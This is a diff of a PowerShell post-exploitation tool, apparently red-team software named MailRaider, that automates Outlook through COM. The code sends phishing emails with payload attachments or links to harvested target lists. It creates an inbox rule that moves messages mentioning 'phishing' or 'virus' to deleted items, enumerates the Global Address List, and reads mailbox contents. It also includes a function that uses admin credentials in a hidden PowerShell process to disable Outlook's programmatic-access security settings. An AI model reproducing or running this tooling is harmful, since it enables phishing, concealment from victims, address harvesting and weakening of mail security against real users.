@@ -3,13 +3,13 @@
 <#
 
 
-MailMan v0.1
+MailRaider v0.1
 
 by @xorrior
 
 #>
 
-Function Invoke-Spam {
+Function Invoke-SendMail {
     <#
     .SYNOPSIS
     This function sends emails using a custom or default template to specified target email addresses.
@@ -27,7 +27,7 @@ Function Invoke-Spam {
     .PARAMETER URL
     URL to include in the email
 
-    .PARAMETER PayloadFile
+    .PARAMETER Attachment
     Full path to the file to use as a payload 
 
     .PARAMETER Template
@@ -41,13 +41,13 @@ Function Invoke-Spam {
 
     .EXAMPLE
 
-    Invoke-Spam -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
+    Invoke-SendMail -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
 
     Send phishing email to the array of target email addresses with an embedded url. 
 
     .EXAMPLE
 
-    Invoke-Spam -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
+    Invoke-SendMail -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
 
     Send phishing email to the list of addresses from file and include the specified attachment. 
 
@@ -118,16 +118,18 @@ Function Invoke-Spam {
 
     if(Test-Path $sigpath){
         $Signature = Get-Content -Path $sigpath
-    }
+    } 
+     
 
-    #Create Outlook rule to automatically sends emails pertaining to phishing emails to deleted items folder 
+    
+    #Create Outlook rule to automatically sends emails pertaining to phishing emails to deleted items folder
     Invoke-Rule -Subject $Subject -RuleName "RaiderIn"
 
-     
     #Iterate through the list, craft the emails, and then send it off. 
     ForEach($Target in $TargetEmails){
 
-        $Email = $script:Outlook.CreateItem(0)
+        $Outlook = Get-OutlookInstance
+        $Email = $Outlook.CreateItem(0)
         #If there was an attachment, include it with the email 
         if($Attachment){
             $($Email.Attachment).Add($Attachment)
@@ -142,11 +144,14 @@ Function Invoke-Spam {
         }
         $Email.Send()
 
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
     } 
+
+    
    
 }
 
-#This function is a work-in-progress
+
 Function Invoke-Rule {
 
     <#
@@ -170,6 +175,9 @@ Function Invoke-Rule {
         [Parameter(Mandatory = $True, Position = 1)]
         [string]$RuleName,
 
+        [Parameter(Mandatory = $False, Position = 2)]
+        [System.__ComObject]$Outlook,
+
         [Parameter(Mandatory = $False)]
         [switch]$Disable
     )
@@ -181,24 +189,31 @@ Function Invoke-Rule {
     $flags += "phishing"
     $flags += "virus"
 
+    If(!($Outlook)){
+
+        $Outlook = Get-OutlookInstance
+        $MAPI = $Outlook.GetNamespace('MAPI')
+
+    }
 
     if($Disable){
-        $rule = (($script:Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
+        $rule = (($Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
         $rule.enabled = $False 
     }
     else{
 
         #Load the assembly for Outlook objects 
-        Add-Type -AssemblyName Microsoft.Office.Interop.Outlook | Out-Null 
+        Add-Type -AssemblyName Microsoft.Office.Interop.Outlook | Out-Null
+        $MAPI = $Outlook.GetNamespace('MAPI')
         $inbox = Get-OutlookFolder -Name "Inbox"
         $DeletedFolder = Get-OutlookFolder -Name "DeletedItems"
         #Retrieve all Outlook rules 
-        $rules = $script:MAPI.DefaultStore.GetRules()
+        $rules = $MAPI.DefaultStore.GetRules()
         $rule = $rules.create($RuleName, [Microsoft.Office.Interop.Outlook.OlRuleType]::OlRuleReceive)
 
-        $Subject = $rule.Conditions.Subject
-        $Subject.Enabled = $true
-        $Subject.Text = $flags
+        $SubText = $rule.Conditions.Subject
+        $SubText.Enabled = $true
+        $SubText.Text = $flags
         $action = $rule.Actions.MoveToFolder
         $action.enabled = $true
         [Microsoft.Office.Interop.Outlook._MoveOrCopyRuleAction].InvokeMember(
@@ -210,6 +225,8 @@ Function Invoke-Rule {
         #Save and enable the rule 
         $rules.Save()
     }
+
+    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null 
     
 
 }
@@ -263,7 +280,7 @@ Function Get-OSVersion {
     $OSArch 
 }
 
-Function Select-NextItem{
+Function Select-EmailItem{
     <#
     .SYNOPSIS
     This function selects an Email Item according to an index and displays it
@@ -282,16 +299,16 @@ Function Select-NextItem{
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $False, Position = 0)]
-        [Int]$Index = 1
+        [Int]$Index = 0,
+
+        [Parameter(Mandatory = $True, Position = 1)]
+        [System.__ComObject]$FolderObj
     )
+
+    $EmailItem = $FolderObj.Items | Select-Object To,SenderName,SenderEmailAddress,Subject,Body,SentOn,ReceivedTime -Index $Index
+
+    $EmailItem
     
-    $script:count += $Index
-
-    $items = $script:CurrentFolder.Items 
-
-    $script:CurrentItem = $items[$count]
-
-    $script:CurrentItem | Select-Object SenderName, SenderEmailAddress, ReceivedTime, Subject, Body 
 }
 
 Function Select-SubFolder{
@@ -318,12 +335,11 @@ Function Select-SubFolder{
 
     #If the FolderName isn't specified, display all of the sub folder names 
     If(!($FolderName)){
-        $script:CurrentFolder.Folders | Select-Object Name 
+        $script:CurrentFolder.Folders | ForEach {$_.Name}
     }
     else {
         $script:CurrentFolder = $script:CurrentFolder.Folders($FolderName)
-        $FolderItem = $script:CurrentFolder.Items | Select-Object ReceivedTime, SenderName, SenderEmailAddress, Subject, Body -First 1
-        $FolderItem
+        $script:CurrentFolder.Name 
     }
 
     
@@ -337,6 +353,9 @@ Function Select-Folder {
     .PARAMETER FolderName
     The Name of the Outlook Default Folder.
 
+    .PARAMETER Index
+    Index of the Email item within the selected folder to display
+
     .EXAMPLE
 
     Select-Folder -FolderName "Inbox"
@@ -348,15 +367,21 @@ Function Select-Folder {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True, Position = 0)]
-        [string]$FolderName
+        [string]$FolderName,
+
+        [Parameter(Mandatory = $False, Position = 1)]
+        [string]$Index
     )
 
+    $Folder = Get-OutlookFolder -Name $FolderName
 
-    $script:CurrentFolder = Get-OutlookFolder -Name $FolderName 
-
-    $FolderItem =  $script:CurrentFolder.Items | Select-Object ReceivedTime, SenderName, SenderEmailAddress, Subject, Body -First 1
-
-    $FolderItem
+    Write-Verbose "Obtained Folder object"
+    If($Index){
+        Select-EmailItem -Index $Index -FolderObj $Folder
+    }
+    else {
+        $Folder.Name 
+    }
 }
 
 Function Get-OutlookFolder{
@@ -407,9 +432,15 @@ Function Get-OutlookFolder{
 
     $Value = $OlDefaultFolders.Item($DefaultFolderName)
 
-    $FolderObj =  $script:MAPI.GetDefaultFolder($Value)
+    $Outlook = Get-OutlookInstance
+
+    $MAPI = $Outlook.GetNamespace('MAPI')
+
+    $FolderObj =  $MAPI.GetDefaultFolder($Value)
 
     Write-Verbose "Obtained Folder Object"
+
+    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
 
     $FolderObj
 
@@ -446,15 +477,14 @@ Function Get-EmailItems{
         [switch]$FullObject
     )
     
-    $FOlderObj = $Folder
     
     if($MaxEmails){
         Write-Verbose "Selecting the first $MaxEmails emails"
-        $Items = $FolderObj.Items | Select-Object -First $MaxEmails
+        $Items = $Folder.Items | Select-Object -First $MaxEmails
     }
     else{
         Write-Verbose "Selecting all emails"
-        $Items = $FolderObj.Items
+        $Items = $Folder.Items
     }
 
     if(!($FullObject)){
@@ -686,16 +716,19 @@ Function Get-SubFolders{
     [CmdletBinding()]
     param(
         [parameter(Mandatory = $False, Position = 0)]
-        [System.__ComObject]$Folder
+        [System.__ComObject]$Folder,
+
+        [parameter(Mandatory = $False)]
+        [switch]$FullObject
     )
 
     $SubFolders = $Folder.Folders
 
     If(!($SubFolders)){
-        Write-Verbose "No subfolders were found for folder: $($Folder.Name)"
+        Throw "No subfolders were found for folder: $($Folder.Name)"
     }
 
-    if(!($Fullobject)){
+    if(!($FullObject)){
         $SubFolders = $SubFolders | ForEach {$_.Name}
     }
     
@@ -710,16 +743,33 @@ Function Get-GlobalAddressList{
     .SYNOPSIS
     This function returns an array of Contact objects from a Global Address List object.
 
+    .PARAMETER Outlook
+    The MAPI namespace object for Outlook 
+
+    .EXAMPLE 
+
+    Get-GlobalAddressList -MAPI $MAPI
+
+    Return the GAL for the MAPI namespace 
+
     #>
 
-    if($script:MAPI){
-        $GAL = $script:MAPI.GetGlobalAddressList()
-    }
-    else {
-        Throw "Unable to obtain the Global Address List"
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $False)]
+        [System.__ComObject]$MAPI
+    )
+
+    if(!($MAPI)){
+
+        $Outlook = Get-OutlookInstance
+        $MAPI = $Outlook.GetNamespace('MAPI')
     }
 
+    $GAL = $MAPI.GetGlobalAddressList()
+
     $GAL = $GAL.AddressEntries
+    
     $GAL 
 }
 
@@ -745,8 +795,11 @@ Function Get-SMTPAddress{
         [string[]]$FullNames
     )
 
+    $Outlook = Get-OutlookInstance
+    $MAPI = $Outlook.GetNamespace('MAPI')
     #Grab the GAL 
-    $GAL = Get-GlobalAddressList
+    $GAL = Get-GlobalAddressList -MAPI $MAPI 
+
     #If the full name is given, try to obtain the exchange user object
 
     $PrimarySMTPAddresses = @() 
@@ -761,16 +814,17 @@ Function Get-SMTPAddress{
             $PrimarySMTPAddresses += $($User.GetExchangeuser()).PrimarySMTPAddress
         }
     }
-    else{
+    else {
         try {
-            $PrimarySMTPAddresses = (((($script:MAPI.CurrentUser).Session).CurrentUser).AddressEntry.GetExchangeuser()).PrimarySmtpAddress
+            $($($($Outlook.Session).CurrentUser).AddressEntry).GetExchangeUser().PrimarySMTPAddress
         }
-        catch{
-            Throw "Unable to obtain primary smtp address for the current user"
+        catch {
+            Throw "Unable to obtain PrimarySMTPAddress for the current user"
         }
     }
-
     $PrimarySMTPAddresses
+
+    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
 
 }
 
@@ -796,10 +850,10 @@ Function Disable-SecuritySettings{
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $False)]
-        [string]$User,
+        [string]$AdminUser,
 
         [Parameter(Mandatory = $False)]
-        [string]$Password,
+        [string]$AdminPassword,
 
         [parameter(Mandatory = $True)]
         [string]$Version
@@ -897,11 +951,11 @@ Function Disable-SecuritySettings{
                   
     }
 
-    if($User -and $Password){
+    if($AdminUser -and $AdminPassword){
 
         #If creds are given start a new powershell process and run the commands. Unable to use the Credential parameter with 
-        $pw = ConvertTo-SecureString $Password -asplaintext -Force
-        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
+        $pw = ConvertTo-SecureString $AdminPassword -asplaintext -Force
+        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $AdminUser,$pw
         $WD = 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\'
         $Arg = " -WindowStyle hidden -Command $cmd"
         Start-Process "powershell.exe" -WorkingDirectory $WD -Credential $creds -ArgumentList $Arg
@@ -926,10 +980,10 @@ Function Disable-SecuritySettings{
     
 
     if($count -eq 1){
-        $True
+        Write-Verbose "Everyting seems ok......"
     }
     elseif($count -eq 0){
-        $False
+        Write-Verbose "Uhhhh, don't run any functions from this script......"
     }
 
 }
@@ -1011,95 +1065,24 @@ Function Reset-SecuritySettings{
 Function Get-OutlookInstance{
     <#
     .SYNOPSIS
-    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application. Specify a Username and password of an admin level account if the 
-    current user does not have administrative privileges. This level of access is needed to change/create the Outlook security registry keys. 
-
-    .PARAMETER AdminUser
-    Username of account with administrative privileges 
-
-    .PARAMETER AdminPass
-    Password of account with administrative privileges
+    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application. 
 
     .EXAMPLE
-    Get-OutlookInstance -User "TEST\cross" -Password "BAhbAhBlackSheep"
+    Get-OutlookInstance
 
     Get an instance of Outlook and use the specified credentials to change the registry keys. 
 
     #>
-
-    [CmdletBinding(DefaultParameterSetName = "None")]
-    param(
-
-        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
-        [switch]$DisablePrompt,
-
-        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
-        [string]$AdminUser,
-
-        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
-        [string]$AdminPass
-    )
-
-    #Switch user context from Administrator to the 
-    Write-Verbose "Checking to see if Outlook is currently running"
-    [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices") | Out-Null
-    if(Get-Process | Where-Object {$_.ProcessName -like "*OUTLOOK*"}){
-        #If outlook is currently running, grab an instance. This script must be running in the same user context as Outlook in order for this to work.  
-        try{
-            $script:Outlook = [System.Runtime.InteropServices.Marshal]::GetActiveObject("Outlook.Application")
-        }
-        catch {
-            Throw "Unable to obtain Outlook instance"
-        }
+    try {
+        $Outlook = New-Object -ComObject "Outlook.Application"
     }
-    else{
-        #Start an Outlook instance
-        try {
-            $script:Outlook = New-Object -ComObject "Outlook.Application"   
-        }
-        catch {
-            Throw "Unable to create Outlook com object"
-        }
+    catch {
+        Throw "Unable to open Outlook ComObject"
     }
-
-    $OV = $script:Outlook.Version
-    $OV = $OV.Substring(0,4)
     
-    if($DisablePrompt){
-        if($AdminUser -and $AdminPass){
-            $result = Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
-            $script:DisableUser = $AdminUser
-            $script:DisablePass = $AdminPass
-            if($result){
-                Write-Verbose "Programmatic access prompt has been disabled"
-                $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
-            }
-            else {
-                Write-Warning "Programmatic access has not been disabled"
-            }
-        }
-        else{
-            $result = Disable-SecuritySettings -Version $OV 
-            if($result){
-                Write-Verbose "Programmatic access prompt has been disabled"
-                $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
-            }
-            else {
-                Write-Warning "Programmatic access has not been disabled"
-            }
-            
-        }
-    
-    }
-    else{
-        $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
-        Write-Verbose "Obtained MAPI session"
-    }
 
-    #$Script:MAPI = $script:Outlook.GetNamespace('MAPI')
-    #Namespace.Logon method is unnecessary if we are using the default profile 
-    #$script:MAPI.Logon("", "", $NULL, $NULL)
-    
+    $Outlook
+
 
 }
 
